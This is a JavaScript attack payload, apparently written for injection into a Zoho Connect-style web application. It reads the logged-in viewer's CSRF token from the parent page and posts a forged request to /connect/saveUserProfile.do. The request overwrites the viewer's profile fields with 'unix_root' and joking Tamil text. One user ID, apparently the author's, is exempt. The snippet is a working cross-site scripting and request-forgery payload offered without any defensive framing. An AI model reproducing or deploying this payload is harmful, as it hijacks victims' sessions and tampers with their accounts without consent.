var test="{'scopeID':'"+scopeID+"','firstName':'unix_root','lastName':'unix_root','aboutMe':'Onnum perusaa solrathukku illa','skills':'Eppavumey summa irukrathu','interests':'Summa iruka pudikum','departments':'Summa thaanga iruken','jobTitle':'Summa Iruken','zpcpn':'"+parent.getCsrfToken()+"'}";
test=test.replace(/'/g,"\"");
test=JSON.parse(test);
if(parent.zuid.toString().indexOf('64330397') == -1){$.post('/connect/saveUserProfile.do',test);}else{alert()};
